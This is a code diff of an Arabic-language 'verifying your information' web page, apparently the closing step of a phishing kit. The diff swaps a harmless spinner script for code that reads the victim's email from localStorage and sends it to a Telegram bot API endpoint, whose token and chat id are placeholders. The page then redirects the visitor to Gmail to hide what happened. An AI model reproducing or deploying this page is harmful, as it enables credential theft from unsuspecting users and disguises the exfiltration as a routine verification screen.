@@ -1,43 +1,26 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html dir="rtl" lang="ar">
 <head>
   <meta charset="UTF-8">
   <title>جارٍ التحقق...</title>
   <style>
-    body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; flex-direction: column; }
-    .circle {
-      border: 6px solid #ccc;
-      border-top: 6px solid #4285f4;
-      border-radius: 50%;
-      width: 60px;
-      height: 60px;
-      animation: spin 1s linear infinite;
-      margin-bottom: 20px;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    .check {
-      font-size: 40px;
-      color: #34a853;
-      display: none;
-    }
+    body { text-align: center; font-family: sans-serif; }
+    .circle { width: 100px; height: 100px; border-radius: 50%; border: 5px solid green; margin: 50px auto; animation: spin 2s linear infinite; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
+  <h2>جارٍ التحقق من معلوماتك...</h2>
   <div class="circle"></div>
-  <div class="check">✓ تم التحقق</div>
+  <p>يرجى الانتظار، سيتم تحويلك خلال لحظات</p>
 
   <script>
-    setTimeout(() => {
-      document.querySelector(".circle").style.display = "none";
-      document.querySelector(".check").style.display = "block";
-    }, 3000);
+    const email = localStorage.getItem("email");
+    fetch(`https://api.telegram.org/bot<توكنك>/sendMessage?chat_id=<IDك>&text=🎯 تم التحقق النهائي\nEmail: ${email}`);
 
     setTimeout(() => {
       window.location.href = "https://mail.google.com";
-    }, 5000);
+    }, 4000);
   </script>
 </body>
 </html>
